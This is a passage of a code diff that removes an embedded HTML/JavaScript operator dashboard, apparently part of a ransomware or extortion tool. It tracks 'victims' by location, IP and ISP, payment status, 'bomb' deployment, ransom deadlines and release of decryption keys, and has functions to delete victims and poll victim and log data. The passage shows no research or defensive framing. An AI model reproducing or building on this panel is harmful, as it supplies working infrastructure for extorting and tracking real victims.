-                        <b>ID:</b> ${v.id}<br>
-                        <b>Files:</b> ${v.files}<br>
-                        <b>Location:</b> ${v.street ? v.street + ', ' : ''}${v.city}, ${v.country}<br>
-                        <b>IP:</b> ${v.ip}<br>
-                        <b>ISP:</b> ${v.isp}<br>
-                        <b>Status:</b> <span class="${v.status === 'paid' ? 'status-paid' : 'status-unpaid'}">${v.status}</span><br>
-                        <b>Bomb:</b> ${v.bomb_status} ${v.bomb_size > 0 ? '(' + v.bomb_size.toFixed(2) + ' GB)' : ''}<br>
-                        <b>Deadline:</b> ${new Date(v.deadline).toLocaleString()}<br>
-                        ${v.status === 'paid' ? '<b>Key:</b> ' + v.key : ''}
-                    `;
-                } else {
-                    document.getElementById('victim_info').innerHTML = 'Victim not found';
-                }
-            } catch(e) {
-                document.getElementById('victim_info').innerHTML = 'Error loading victim';
-            }
-        }
-        
-        async function deleteVictim() {
-            const id = document.getElementById('victim_id').value;
-            if (!id) return;
-            if (confirm('Delete ' + id + '?')) {
-                try {
-                    await fetch(`/api/victim/${id}`, {method: 'DELETE'});
-                    loadVictims();
-                    loadBombs();
-                    document.getElementById('victim_info').innerHTML = 'Victim deleted';
-                } catch(e) {}
-            }
-        }
-        
-        async function quickDelete(id) {
-            if (confirm('Delete ' + id + '?')) {
-                try {
-                    await fetch(`/api/victim/${id}`, {method: 'DELETE'});
-                    loadVictims();
-                    loadBombs();
-                } catch(e) {}
-            }
-        }
-        
-        function logout() {
-            window.location.href = '/';
-        }
-        
-        function updateTime() {
-            document.getElementById('timestamp').innerText = new Date().toLocaleString();
-        }
-        
-        function startUpdates() {
-            loadStats();
-            loadVictims();
-            loadBombs();
-            loadLogs();
-            updateTime();
-            
-            if (updateInterval) clearInterval(updateInterval);
-            updateInterval = setInterval(() => {
-                loadStats();
-                loadVictims();
-                loadBombs();
-                loadLogs();
-                updateTime();
-            }, 10000);
-        }
-        
-        startUpdates();
-    </script>
-</body>
-</html>
-"""
 
 # ============================================================================
 # MAIN
